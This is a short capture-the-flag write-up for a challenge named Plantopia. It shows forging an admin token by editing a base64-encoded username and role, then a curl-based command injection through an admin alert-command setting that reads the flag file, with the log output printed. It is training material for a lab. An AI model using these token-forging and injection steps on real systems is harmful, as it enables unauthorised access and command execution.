# Plantopia

Login with provided `testuser`/`testpassword` combo.
Get the admin token (can take your token, base64 decode, will be `testuser.0.<timestamp>` change it to
`admin.1.<timestamp>` and that will work for admin.

First update the alert command in the sendmail command:

```shell
curl -X 'POST' \
  'http://challenge.ctf.games:<PORT>/api/admin/settings' \
  -H 'accept: application/json' \
  -H 'Authorization: YWRtaW4uMS4xNzI5NjQ0NTE5' \
  -H 'Content-Type: application/json' \
  -d '{
  "plant_id": 1,
  "alert_command": "/usr/sbin/sendmail -t | cat flag.txt",
  "watering_threshold": 50
}'
```

Then trigger the command:

```shell
curl -X 'POST' \
  'http://challenge.ctf.games:<PORT>/api/admin/sendmail' \
  -H 'accept: application/json' \
  -H 'Authorization: YWRtaW4uMS4xNzI5NjQ0NTE5' \
  -H 'Content-Type: application/json' \
  -d '{
  "plant_id": 1
}'
```

Then the exectution output will be in the admin logs:

```shell
curl -X 'GET' \
  'http://challenge.ctf.games:<PORT>/api/admin/logs' \
  -H 'accept: application/json' \
  -H 'Authorization: YWRtaW4uMS4xNzI5NjQ0NTE5'

DEBUG - Executing command: /usr/sbin/sendmail -t | cat flag.txt\n2024-10-23 00:22:25,019 - DEBUG - Command output: flag{c29c4d53fc432f7caeb573a9f6eae6c6}\n\n2024-10-23 00:22:25,019 
```